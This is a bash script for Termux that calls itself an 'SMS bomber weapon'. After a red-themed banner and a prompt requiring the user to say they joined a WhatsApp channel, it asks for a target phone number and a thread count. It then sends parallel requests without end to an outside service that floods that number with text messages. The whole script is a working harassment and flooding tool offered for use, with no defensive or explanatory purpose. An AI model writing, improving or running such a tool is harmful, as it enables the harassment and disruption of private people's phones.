#!/data/data/com.termux/files/usr/bin/bash

# Blood Red Style Banner
clear
echo -e "\033[1;31m"
echo -e "\033[48;5;52m"  # Dark red background
echo " ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ "
echo " ██▀▀▀▀▀▀▀▀▀  ██▀▀▀▀▀▀▀██  ██▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀██▀▀▀▀ "
echo " ██           ██      ██  ██               ██         ██       ██     ██    "
echo " ███████▄▄    ██████████  ███████▄▄        ██         ██       ████████     "
echo " ▀▀▀▀▀▀▀██    ██▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀██        ██         ██       ██▀▀▀▀██      "
echo "        ██    ██                ██         ██         ██       ██    ██      "
echo " ████████     ██        ▄██████▀█         █████████  █████████ ██    ███████"
echo -e "\033[0m"
echo -e "\033[1;31m> \033[1;33mDeveloper: \033[1;31mOLD-HACKER\033[0m"
echo -e "\033[1;31m▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\033[0m"

# Blood drip effect
echo -e "\033[1;31m"
echo "  (   )"
echo "   ) ("
echo "  (   )"
echo "   \\_/"
echo -e "\033[0m"

# WhatsApp requirement in blood style
echo -e "\033[1;31m"
echo "YOU MUST JOIN OUR WHATSAPP CHANNEL TO USE THIS WEAPON"
echo -e "\033[1;33mChannel Link: \033[1;31mhttps://whatsapp.com/channel/0029VavHzv259PwTIz1XxJ09\033[0m"
echo -e "\033[1;31m▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\033[0m"

# Bloody verification prompt
echo -e "\033[1;31m"
read -p "HAVE YOU JOINED THE CHANNEL? [y/n] " joined
if [ "$joined" != "y" ]; then
    echo -e "\033[1;31mBLOOD SACRIFICE REQUIRED! JOIN FIRST!\033[0m"
    exit 1
fi
echo -e "\033[0m"

# API URL in blood red
echo -e "\033[1;31m"
echo "PREPARING SMS BOMBER WEAPON..."
echo -e "\033[0m"

# Get target number with bloody prompt
echo -e "\033[1;31m"
read -p "ENTER TARGET PHONE NUMBER: " mobile_number
echo -e "\033[0m"

# Thread selection with warning
echo -e "\033[1;31m"
read -p "ENTER NUMBER OF ATTACK THREADS [1-10]: " threads
threads=${threads:-3}
if [[ $threads -lt 1 || $threads -gt 10 ]]; then
    threads=3
fi
echo -e "\033[1;31m"
echo "WARNING: HIGH THREAD COUNT MAY GET YOU BANNED!"
echo -e "\033[0m"

# Bloody attack initiation
count=1
echo -e "\033[1;31m"
echo "INITIATING SMS BOMBING WITH $threads PARALLEL ATTACKS..."
echo "PRESS CTRL+C TO STOP THE BLOODSHED"
echo -e "\033[1;31m▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\033[0m"

while true; do
    for ((i=1; i<=threads; i++)); do
        {
            echo -e "\033[1;31m"
            echo "LAUNCHING ATTACK #$count"
            echo -e "\033[0m"
            response=$(curl -s -X GET "https://shadowtools.site/sms-bomber.php?num=$mobile_number")
            echo -e "\033[1;31mATTACK #$count RESULT: \033[1;33m$response\033[0m"
            echo -e "\033[1;31m▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\033[0m"
            ((count++))
        } &
    done
    wait
    sleep 0.1
done
